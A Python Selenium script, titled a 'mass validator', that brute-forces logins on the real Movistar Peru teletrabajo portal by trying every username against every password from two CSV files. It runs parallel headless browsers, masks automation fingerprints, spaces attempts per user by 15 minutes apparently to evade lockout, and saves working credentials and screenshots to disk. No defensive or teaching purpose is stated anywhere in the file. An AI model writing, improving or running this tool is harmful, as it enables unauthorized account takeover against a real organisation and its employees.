import time
import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from tqdm import tqdm
from colorama import Fore, Style, init
import os
import logging
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from collections import defaultdict
import random
import psutil

# Configurar logging completo
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - [%(threadName)s] - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('log.txt', encoding='utf-8', mode='w'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Inicializar colores
init(autoreset=True)

# URL del login
URL = "https://teletrabajo.movistar.pe"

# Variables globales de configuración
USAR_PUERTOS_ALEATORIOS = False
NUM_THREADS = 3
CHROMEDRIVER_PATH = None  # Se instala una sola vez

# Locks para sincronización
file_lock = threading.Lock()
ultimo_intento_lock = threading.Lock()
usuarios_exitosos_lock = threading.Lock()
screenshot_counter_lock = threading.Lock()

# Estructuras de datos compartidas
ultimo_intento_usuario = defaultdict(lambda: datetime.min)
usuarios_exitosos = set()
screenshot_counter = 0

def log_info(mensaje):
    """Log con info"""
    logger.info(mensaje)
    print(Fore.CYAN + mensaje)

def log_success(mensaje):
    """Log de éxito"""
    logger.info(mensaje)
    print(Fore.GREEN + mensaje)

def log_error(mensaje):
    """Log de error"""
    logger.error(mensaje)
    print(Fore.RED + mensaje)

def log_warning(mensaje):
    """Log de advertencia"""
    logger.warning(mensaje)
    print(Fore.YELLOW + mensaje)

def matar_procesos_chrome():
    """Forzar cierre de todos los procesos de Chrome y ChromeDriver"""
    try:
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'] in ['chrome.exe', 'chromedriver.exe', 'Google Chrome']:
                    proc.kill()
            except:
                pass
        log_info("🧹 Procesos Chrome limpiados")
    except Exception as e:
        log_warning(f"Error limpiando Chrome: {e}")

def cargar_csv(archivo, nombre_tipo):
    """Cargar CSV con múltiples codificaciones y separadores"""
    try:
        if not os.path.exists(archivo):
            log_error(f"❌ No se encontró el archivo '{archivo}'")
            return None
        
        encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252', 'windows-1252']
        separadores = [',', ';', '\t', '|']
        df = None
        
        for encoding in encodings:
            for sep in separadores:
                try:
                    df = pd.read_csv(archivo, encoding=encoding, sep=sep)
                    if len(df.columns) >= 1:
                        break
                except:
                    continue
            if df is not None and len(df.columns) >= 1:
                break
        
        if df is None:
            log_error(f"❌ No se pudo leer '{archivo}'")
            return None
        
        # Tomar la primera columna
        primera_col = df.columns[0]
        df = df.rename(columns={primera_col: nombre_tipo})
        
        # Limpiar datos
        df[nombre_tipo] = df[nombre_tipo].astype(str).str.strip()
        df = df.dropna(subset=[nombre_tipo])
        df = df.drop_duplicates(subset=[nombre_tipo])
        
        log_success(f"✅ Cargados {len(df)} {nombre_tipo}s desde '{archivo}'")
        return df
        
    except Exception as e:
        log_error(f"❌ Error al cargar '{archivo}': {e}")
        return None

def cargar_datos():
    """Cargar usuarios y contraseñas"""
    log_info("\n" + "="*70)
    log_info("📂 CARGANDO ARCHIVOS CSV")
    log_info("="*70)
    
    usuarios_df = cargar_csv("credenciales.csv", "usuario")
    passwords_df = cargar_csv("contraseña.csv", "password")
    
    if usuarios_df is None or passwords_df is None:
        return None, None
    
    return usuarios_df, passwords_df

def cargar_usuarios_exitosos():
    """Cargar usuarios que ya tuvieron login exitoso"""
    try:
        if os.path.exists("loginexitoso.csv"):
            df = pd.read_csv("loginexitoso.csv")
            usuarios = set(df['usuario'].unique())
            log_info(f"📂 Cargados {len(usuarios)} usuarios exitosos previos")
            return usuarios
    except:
        pass
    return set()

def crear_carpeta_screenshots():
    """Crear carpeta para screenshots si no existe"""
    if not os.path.exists("screenshots"):
        os.makedirs("screenshots")
        log_info("📁 Carpeta 'screenshots' creada")

def tomar_screenshot(driver, usuario, password, resultado):
    """Tomar screenshot con nombre descriptivo"""
    global screenshot_counter
    
    try:
        with screenshot_counter_lock:
            screenshot_counter += 1
            contador = screenshot_counter
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        nombre_archivo = f"screenshots/{contador:04d}_{usuario}_{resultado}_{timestamp}.png"
        
        driver.save_screenshot(nombre_archivo)
        log_info(f"📸 Screenshot guardado: {nombre_archivo}")
        
    except Exception as e:
        log_warning(f"⚠️ No se pudo guardar screenshot: {e}")

def configurar_driver_persistente():
    """Configurar navegador Chrome persistente (se llama una vez por thread)"""
    global USAR_PUERTOS_ALEATORIOS, CHROMEDRIVER_PATH
    
    try:
        options = webdriver.ChromeOptions()
        
        # Modo headless
        options.add_argument("--headless=new")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--disable-extensions")
        
        # Puerto aleatorio si está habilitado
        if USAR_PUERTOS_ALEATORIOS:
            puerto = random.randint(9000, 9999)
            options.add_argument(f"--remote-debugging-port={puerto}")
            log_info(f"🔌 Puerto: {puerto}")
        
        # Recursos deshabilitados
        prefs = {
            "profile.managed_default_content_settings.images": 2,
            "profile.managed_default_content_settings.stylesheets": 2,
        }
        options.add_experimental_option("prefs", prefs)
        options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
        
        # Usar ChromeDriver ya instalado
        service = Service(CHROMEDRIVER_PATH)
        driver = webdriver.Chrome(service=service, options=options)
        driver.set_page_load_timeout(30)
        driver.implicitly_wait(5)
        
        log_success(f"✅ Navegador persistente creado para thread")
        return driver
        
    except Exception as e:
        log_error(f"❌ Error configurando navegador: {e}")
        return None

def puede_intentar_usuario(usuario):
    """Verificar si han pasado 15 minutos desde el último intento"""
    with ultimo_intento_lock:
        ahora = datetime.now()
        ultimo = ultimo_intento_usuario[usuario]
        tiempo_transcurrido = (ahora - ultimo).total_seconds()
        
        if tiempo_transcurrido < 900:  # 15 minutos = 900 segundos
            tiempo_restante = 900 - tiempo_transcurrido
            return False, tiempo_restante
        
        return True, 0

def registrar_intento_usuario(usuario):
    """Registrar el momento del intento"""
    with ultimo_intento_lock:
        ultimo_intento_usuario[usuario] = datetime.now()

def verificar_login_exitoso(driver, wait):
    """Verificar si el login fue exitoso buscando elementos del dashboard"""
    try:
        # Esperar 4 segundos iniciales
        time.sleep(4)
        
        log_info("🔍 Verificando resultado del login...")
        
        # Timeout máximo de 60 segundos
        tiempo_inicio = time.time()
        
        while (time.time() - tiempo_inicio) < 60:
            # 1. Verificar mensaje de error específico
            try:
                error_element = driver.find_element(By.XPATH, 
                    '//*[@id="explicit-auth-screen"]/div[3]/div/div[2]/div[2]/div[3]/div[1]/form/div[6]/div/p/span')
                if error_element.is_displayed():
                    texto_error = error_element.text.strip()
                    log_error(f"❌ Error detectado: {texto_error}")
                    return "INCORRECTO"
            except:
                pass
            
            # 2. Verificar mensajes de error genéricos
            selectores_error = [
                "//div[contains(@class, 'error')]",
                "//span[contains(@class, 'error')]",
                "//*[contains(text(), 'incorrecta')]",
                "//*[contains(text(), 'inválido')]",
            ]
            
            for selector in selectores_error:
                try:
                    elementos = driver.find_elements(By.XPATH, selector)
                    if any(e.is_displayed() and e.text.strip() for e in elementos):
                        log_error(f"❌ Error genérico detectado")
                        return "INCORRECTO"
                except:
                    pass
            
            # 3. Verificar cambio de URL (señal de éxito)
            url_actual = driver.current_url
            if url_actual != URL and "login" not in url_actual.lower():
                log_success(f"✅ URL cambió: {url_actual}")
                return "EXITOSO"
            
            # 4. Verificar elementos del dashboard
            selectores_dashboard = [
                "//div[contains(@class, 'dashboard')]",
                "//div[contains(@class, 'home')]",
                "//a[contains(text(), 'Cerrar sesión')]",
                "//a[contains(text(), 'Logout')]",
                "//button[contains(text(), 'Salir')]",
                "//*[contains(@class, 'user-menu')]",
                "//*[contains(@class, 'profile')]",
            ]
            
            for selector in selectores_dashboard:
                try:
                    elementos = driver.find_elements(By.XPATH, selector)
                    if any(e.is_displayed() for e in elementos):
                        log_success(f"✅ Elemento dashboard detectado")
                        return "EXITOSO"
                except:
                    pass
            
            # 5. Verificar nuevas ventanas/pestañas
            if len(driver.window_handles) > 1:
                log_success(f"✅ Nueva ventana detectada")
                return "EXITOSO"
            
            # Esperar 1 segundo antes de volver a verificar
            time.sleep(1)
        
        # Si pasaron 60 segundos sin error, considerar exitoso
        log_success(f"✅ Sin errores tras 60s")
        return "EXITOSO"
        
    except Exception as e:
        log_error(f"❌ Error verificando login: {e}")
        return "ERROR"

def intentar_login(driver, wait, usuario, password):
    """Intentar login con un driver persistente"""
    try:
        log_info(f"🚀 Login: {usuario} | {password}")
        
        # Ir a la página
        driver.get(URL)
        time.sleep(2)
        
        # Ingresar usuario
        input_user = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="login"]')))
        input_user.clear()
        input_user.send_keys(usuario)
        time.sleep(0.3)
        
        # Ingresar contraseña
        input_pass = wait.until(EC.presence_of_element_located((By.XPATH, '//*[@id="passwd"]')))
        input_pass.clear()
        input_pass.send_keys(password)
        time.sleep(0.3)
        
        # Click en botón login
        boton_login = wait.until(EC.element_to_be_clickable((By.XPATH, '//*[@id="nsg-x1-logon-button"]')))
        boton_login.click()
        log_info("✓ Click en login")
        
        # Verificar resultado (espera inteligente)
        resultado = verificar_login_exitoso(driver, wait)
        
        # Tomar screenshot
        tomar_screenshot(driver, usuario, password, resultado)
        
        # Si es exitoso, marcarlo
        if resultado == "EXITOSO":
            with usuarios_exitosos_lock:
                usuarios_exitosos.add(usuario)
                log_success(f"🎯 Usuario '{usuario}' EXITOSO - Excluido")
        
        return resultado
        
    except Exception as e:
        log_error(f"❌ Error en login: {e}")
        tomar_screenshot(driver, usuario, password, "ERROR")
        return "ERROR"

def guardar_resultado(usuario, password, resultado):
    """Guardar resultado en CSV correspondiente"""
    try:
        with file_lock:
            fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if resultado == "EXITOSO":
                archivo = "loginexitoso.csv"
            else:
                archivo = "loginincorrecto.csv"
            
            existe = os.path.exists(archivo)
            
            df_nueva = pd.DataFrame([{
                'usuario': usuario,
                'password': password,
                'resultado': resultado,
                'fecha_hora': fecha_hora
            }])
            
            if existe:
                df_nueva.to_csv(archivo, mode='a', header=False, index=False, encoding='utf-8')
            else:
                df_nueva.to_csv(archivo, mode='w', header=True, index=False, encoding='utf-8')
            
    except Exception as e:
        log_error(f"Error guardando: {e}")

def worker_thread(tareas_usuario):
    """Thread worker que mantiene un navegador persistente"""
    driver = None
    wait = None
    
    try:
        # Crear navegador persistente para este thread
        driver = configurar_driver_persistente()
        if not driver:
            log_error("❌ No se pudo crear navegador persistente")
            return []
        
        wait = WebDriverWait(driver, 20)
        resultados = []
        
        # Procesar todas las tareas asignadas a este thread
        for usuario, password in tareas_usuario:
            try:
                # Verificar si el usuario ya fue exitoso
                with usuarios_exitosos_lock:
                    if usuario in usuarios_exitosos:
                        log_warning(f"⏭️ '{usuario}' ya exitoso - SKIP")
                        resultados.append((usuario, password, "SALTADO"))
                        continue
                
                # Verificar si puede intentarse (15 min)
                puede_intentar, tiempo_restante = puede_intentar_usuario(usuario)
                
                if not puede_intentar:
                    log_warning(f"⏳ '{usuario}' requiere esperar {int(tiempo_restante/60)} min - SKIP")
                    resultados.append((usuario, password, "ESPERANDO"))
                    continue
                
                # Registrar intento
                registrar_intento_usuario(usuario)
                
                # Intentar login
                resultado = intentar_login(driver, wait, usuario, password)
                
                # Guardar resultado
                guardar_resultado(usuario, password, resultado)
                
                resultados.append((usuario, password, resultado))
                
                # Si fue exitoso, reiniciar navegador
                if resultado == "EXITOSO":
                    log_info("🔄 Reiniciando navegador tras éxito...")
                    try:
                        driver.quit()
                    except:
                        pass
                    driver = configurar_driver_persistente()
                    if driver:
                        wait = WebDriverWait(driver, 20)
                
            except Exception as e:
                log_error(f"❌ Error procesando {usuario}: {e}")
                resultados.append((usuario, password, "ERROR"))
                
                # Reintentar crear navegador si falló
                try:
                    driver.quit()
                except:
                    pass
                driver = configurar_driver_persistente()
                if driver:
                    wait = WebDriverWait(driver, 20)
        
        return resultados
        
    except Exception as e:
        log_error(f"❌ Error en worker thread: {e}")
        return []
    
    finally:
        # Cerrar navegador al finalizar todas las tareas del thread
        if driver:
            try:
                driver.quit()
                log_info("🔒 Navegador cerrado")
            except:
                pass

def distribuir_tareas_from_list(tareas, num_threads):
    """Dividir una lista de (usuario,password) en chunks para cada thread"""
    if not tareas:
        return []
    tamaño_chunk = max(1, len(tareas) // num_threads)
    chunks = []
    for i in range(num_threads):
        inicio = i * tamaño_chunk
        if i == num_threads - 1:
            fin = len(tareas)
        else:
            fin = min(len(tareas), (i + 1) * tamaño_chunk)
        chunk = tareas[inicio:fin]
        if chunk:
            chunks.append(chunk)
    return chunks

def main():
    """Función principal"""
    global usuarios_exitosos, USAR_PUERTOS_ALEATORIOS, NUM_THREADS, CHROMEDRIVER_PATH
    
    log_info("="*70)
    log_info("🚀 VALIDADOR MASIVO - TELETRABAJO MOVISTAR")
    log_info("⚡ Versión optimizada con navegadores persistentes")
    log_info("="*70)
    
    # Instalar ChromeDriver UNA SOLA VEZ
    log_info("📦 Instalando ChromeDriver...")
    CHROMEDRIVER_PATH = ChromeDriverManager().install()
    log_success(f"✅ ChromeDriver instalado: {CHROMEDRIVER_PATH}")
    
    # Crear carpeta screenshots
    crear_carpeta_screenshots()
    
    # CONFIGURACIÓN
    print("\n" + "="*70)
    print("⚙️  CONFIGURACIÓN")
    print("="*70)
    
    respuesta_puertos = input("\n¿Usar puertos aleatorios para cada navegador? (s/n) [Recomendado: s]: ").lower()
    USAR_PUERTOS_ALEATORIOS = respuesta_puertos == 's'
    
    if USAR_PUERTOS_ALEATORIOS:
        log_success("✅ Puertos aleatorios ACTIVADOS (mejor para múltiples threads)")
    else:
        log_warning("⚠️ Puertos aleatorios DESACTIVADOS")
    
    print("\n💡 Recomendaciones según tu equipo:")
    print("   - 2-5 threads: PC básico (4-8 GB RAM)")
    print("   - 5-10 threads: PC medio (8-16 GB RAM)")
    print("   - 10-20 threads: PC potente (16+ GB RAM)")
    print("   - 20+ threads: Servidor o cloud")
    
    try:
        NUM_THREADS = int(input("\n🔧 ¿Cuántos navegadores simultáneos? [Recomendado: 5-10]: ") or "5")
        if NUM_THREADS < 1:
            NUM_THREADS = 1
        log_info(f"✅ Configurado para {NUM_THREADS} navegadores en paralelo")
    except:
        NUM_THREADS = 5
        log_warning(f"⚠️ Usando valor por defecto: {NUM_THREADS}")
    
    print("\n" + "="*70)
    
    # Cargar datos
    usuarios_df, passwords_df = cargar_datos()
    if usuarios_df is None or passwords_df is None:
        return
    
    # Cargar usuarios exitosos previos
    usuarios_exitosos = cargar_usuarios_exitosos()
    
    usuarios = usuarios_df['usuario'].tolist()
    passwords = passwords_df['password'].tolist()
    
    # Construir todas las combinaciones usuario x password
    all_combinations = [(u, p) for u in usuarios for p in passwords]
    # Filtrar inmediatamente combinaciones con usuarios ya exitosos
    pending_combinations = [comb for comb in all_combinations if comb[0] not in usuarios_exitosos]
    total_combinaciones = len(pending_combinations)
    
    log_info(f"\n📊 ESTADÍSTICAS:")
    log_info(f"   👥 Usuarios totales: {len(usuarios):,}")
    log_info(f"   ✅ Ya exitosos: {len(usuarios_exitosos)}")
    log_info(f"   🔄 Usuarios activos: {len(set([u for u,_ in pending_combinations])):,}")
    log_info(f"   🔑 Contraseñas: {len(passwords)}")
    log_info(f"   🔢 Combinaciones totales pendientes: {total_combinaciones:,}")
    log_info(f"   ⏱️ Tiempo mínimo entre intentos: 15 min")
    
    if total_combinaciones == 0:
        log_success("🎉 ¡No hay combinaciones pendientes para procesar!")
        return
    
    # Estadísticas
    exitosos = 0
    incorrectos = 0
    errores = 0
    saltados = 0
    procesados_total = 0
    
    try:
        log_info(f"\n🏁 INICIANDO PROCESAMIENTO (se repetirá hasta procesar todas las combinaciones)\n")
        
        with tqdm(total=total_combinaciones, desc="🔄 Progreso global", unit="comb") as pbar:
            # Bucle principal que se repite hasta vaciar pending_combinations
            while pending_combinations:
                # Preparar lista de tareas que sí pueden intentarse ahora
                ready = []
                waiting_info = []
                
                for usuario, password in pending_combinations:
                    with usuarios_exitosos_lock:
                        if usuario in usuarios_exitosos:
                            # Si usuario ya exitoso, no procesamos sus combinaciones
                            continue
                    puede, tiempo_restante = puede_intentar_usuario(usuario)
                    if puede:
                        ready.append((usuario, password))
                    else:
                        waiting_info.append((usuario, tiempo_restante))
                
                if not ready:
                    # No hay tareas listas: calcular mínimo tiempo a esperar
                    if waiting_info:
                        min_remaining = min(t for u,t in waiting_info)
                        segs = int(min_remaining) + 1
                        minutos = segs // 60
                        seg_extra = segs % 60
                        log_info(f"⏳ No hay tareas listas ahora. Esperando {minutos}m {seg_extra}s hasta el próximo reintento...")
                        time.sleep(segs)
                        continue
                    else:
                        # No hay ready ni waiting_info -> tal vez todas las combinaciones correspondan a usuarios ya exitosos
                        break
                
                # Dividir ready entre threads
                chunks_tareas = distribuir_tareas_from_list(ready, NUM_THREADS)
                
                # Ejecutar threads (cada worker crea su driver persistente y procesa su chunk)
                with ThreadPoolExecutor(max_workers=min(NUM_THREADS, len(chunks_tareas))) as executor:
                    futures = {executor.submit(worker_thread, chunk): chunk for chunk in chunks_tareas}
                    
                    for future in as_completed(futures):
                        try:
                            resultados = future.result()
                            # Procesar resultados
                            for usuario, password, resultado in resultados:
                                # Actualizar contadores y archivos
                                if resultado == "EXITOSO":
                                    exitosos += 1
                                    procesados_total += 1
                                    pbar.update(1)
                                    pbar.set_postfix({
                                        'OK': exitosos,
                                        'Fail': incorrectos,
                                        'Skip': saltados,
                                        'Err': errores
                                    })
                                    tqdm.write(Fore.GREEN + f"✅ {usuario} | {password}")
                                elif resultado == "INCORRECTO":
                                    incorrectos += 1
                                    procesados_total += 1
                                    pbar.update(1)
                                    pbar.set_postfix({
                                        'OK': exitosos,
                                        'Fail': incorrectos,
                                        'Skip': saltados,
                                        'Err': errores
                                    })
                                elif resultado == "SALTADO":
                                    saltados += 1
                                    procesados_total += 1
                                    pbar.update(1)
                                    pbar.set_postfix({
                                        'OK': exitosos,
                                        'Fail': incorrectos,
                                        'Skip': saltados,
                                        'Err': errores
                                    })
                                elif resultado == "ESPERANDO":
                                    # Si el worker devolvió ESPERANDO, NO removemos la combinación de pending_combinations,
                                    # se intentará en próximas iteraciones
                                    log_info(f"⏳ {usuario} | {password} -> ESPERANDO (se reintentará más tarde)")
                                else:
                                    errores += 1
                                    procesados_total += 1
                                    pbar.update(1)
                                    pbar.set_postfix({
                                        'OK': exitosos,
                                        'Fail': incorrectos,
                                        'Skip': saltados,
                                        'Err': errores
                                    })
                            
                            # Después de procesar los resultados del future, eliminamos de pending las combinaciones que ya fueron procesadas
                            # (aquí consideramos procesadas todas las combinaciones que aparecen en los resultados y no estén en estado ESPERANDO)
                            for usuario, password, resultado in resultados:
                                if resultado != "ESPERANDO":
                                    # Remover todas las entradas matching (usuario,password) de pending_combinations
                                    pending_combinations = [comb for comb in pending_combinations if not (comb[0] == usuario and comb[1] == password)]
                                    
                        except Exception as e:
                            log_error(f"Error en future: {e}")
                
                # Al finalizar una pasada, el bucle vuelve a evaluar pending_combinations
                # Si hay combinaciones residuales, el loop esperará el tiempo mínimo necesario en la parte inicial de la iteración
                
        # Resumen final
        log_info("\n" + "="*70)
        log_info("📊 RESUMEN FINAL")
        log_info("="*70)
        log_info(f"✅ Exitosos: {exitosos}")
        log_info(f"❌ Incorrectos: {incorrectos}")
        log_info(f"⏭️ Saltados: {saltados}")
        log_info(f"⚠️ Errores: {errores}")
        log_info(f"📈 Total procesado (no contando ESPERANDO que quedaron reintentándose): {procesados_total}")
        log_info(f"\n📁 Archivos generados:")
        log_info(f"   - loginexitoso.csv")
        log_info(f"   - loginincorrecto.csv")
        log_info(f"   - log.txt")
        log_info(f"   - screenshots/ (carpeta con capturas)")
        log_info(f"\n📅 Finalizado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
    except KeyboardInterrupt:
        log_warning("\n⚠️ INTERRUMPIDO POR USUARIO (se detienen los reintentos en curso)")
    except Exception as e:
        log_error(f"\n❌ ERROR CRÍTICO: {e}")
    finally:
        log_info("\n🧹 Limpiando procesos Chrome...")
        matar_procesos_chrome()
        log_success("✅ FINALIZADO")

if __name__ == "__main__":
    main()
